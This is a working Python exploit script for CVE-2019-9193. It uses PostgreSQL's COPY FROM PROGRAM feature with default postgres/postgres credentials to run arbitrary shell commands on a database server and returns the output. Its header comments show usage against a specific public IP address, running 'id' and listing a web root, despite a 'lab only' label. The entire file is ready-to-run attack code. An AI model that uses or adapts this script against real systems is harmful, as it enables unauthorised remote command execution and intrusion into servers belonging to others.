#./exploit_cve2019_9193_fixed.py -i 136.110.35.102 -p 5432 -d template1 -U postgres -P postgres -c "id"
#./exploit_cve2019_9193_fixed.py -i 136.110.35.102 -p 5432 -U postgres -P postgres -c "ls /var/www/html" -o out.txt


#!/usr/bin/env python3
# exploit_cve2019_9193_fixed.py
# CVE-2019-9193 helper (improved quoting, safer identifier handling)
# Use in authorized lab only.

import argparse
import hashlib
import time
import sys
import psycopg2
from psycopg2 import sql

def parseArgs():
    p = argparse.ArgumentParser(description='CVE-2019-9193 - PostgreSQL COPY FROM PROGRAM helper (lab only)')
    p.add_argument('-i','--ip', default='127.0.0.1', help='Postgres host')
    p.add_argument('-p','--port', type=int, default=5432, help='Postgres port')
    p.add_argument('-d','--database', default='template1', help='Database name')
    p.add_argument('-U','--user', default='postgres', help='DB user')
    p.add_argument('-P','--password', default='postgres', help='DB password')
    p.add_argument('-c','--command', required=True, help='System command to run on server (as single string)')
    p.add_argument('-o','--outfile', default=None, help='Save output to local file')
    p.add_argument('--no-cleanup', action='store_true', help='Do not drop the created table (for inspection)')
    p.add_argument('-t','--timeout', type=int, default=10, help='Connect timeout seconds')
    return p.parse_args()

def random_table():
    return "_" + hashlib.md5(time.ctime().encode()).hexdigest()[:12]

def connect(args):
    return psycopg2.connect(
        database=args.database,
        user=args.user,
        password=args.password,
        host=args.ip,
        port=args.port,
        connect_timeout=args.timeout
    )

def is_superuser(conn):
    cur = conn.cursor()
    try:
        cur.execute("SELECT rolsuper FROM pg_roles WHERE rolname = current_user;")
        r = cur.fetchone()
        return bool(r and r[0])
    finally:
        cur.close()

def run_exploit(conn, cmd, outfile=None, no_cleanup=False):
    cur = conn.cursor()
    tbl = random_table()
    created = False
    try:
        print("[*] Creating table {}".format(tbl))
        # Build SQL using psycopg2.sql to safely insert identifiers
        # Use dollar-quoting for the PROGRAM string to avoid quote escaping issues
        sql_stmt = sql.SQL("""
            DROP TABLE IF EXISTS {tbl};
            CREATE TABLE {tbl}(cmd_output text);
            COPY {tbl} FROM PROGRAM {prog};
            SELECT * FROM {tbl};
        """).format(
            tbl=sql.Identifier(tbl),
            prog=sql.SQL("$${}$$").format(sql.SQL(cmd.replace("$$","$ $")))  # crude protect against $$ inside cmd
        )
        # Execute multi-statement; psycopg2 executes entire string
        cur.execute(sql_stmt.as_string(conn))
        created = True

        # Fetch results
        rows = cur.fetchall()
        out_text = ""
        for r in rows:
            if r and r[0] is not None:
                out_text += str(r[0]) + "\n"

        print("[+] Command output:\n")
        print(out_text if out_text else "<no output>")
        if outfile:
            with open(outfile, "w", encoding="utf-8") as f:
                f.write(out_text)
            print("[*] Saved output to {}".format(outfile))

    except psycopg2.Error as e:
        # better error info
        print("[-] SQL/DB error:", e.pgerror or str(e))
    finally:
        if created and not no_cleanup:
            try:
                print("[*] Dropping table {}".format(tbl))
                cur.execute(sql.SQL("DROP TABLE {t};").format(t=sql.Identifier(tbl)))
            except Exception as e:
                print("[!] Failed to drop table {}: {}".format(tbl, e))
        try:
            cur.close()
        except:
            pass

def main():
    args = parseArgs()
    print("[*] Connecting to {0}:{1} (db={2})".format(args.ip, args.port, args.database))
    try:
        conn = connect(args)
    except Exception as e:
        print("[-] Connection failed:", e)
        sys.exit(1)

    print("[*] Connected")
    try:
        # Basic version check
        cur = conn.cursor()
        cur.execute("SELECT version()")
        v = cur.fetchone()
        if v:
            print("[*] DB version:", v[0])
        cur.close()

        # Warn if not superuser (may still be able if role permits)
        if not is_superuser(conn):
            print("[!] Current DB user is NOT superuser. Exploit may fail if pg_execute_server_program role not granted.")
        else:
            print("[*] Current DB user IS superuser.")

        run_exploit(conn, args.command, outfile=args.outfile, no_cleanup=args.no_cleanup)

    finally:
        try:
            conn.close()
        except:
            pass

if __name__ == "__main__":
    main()
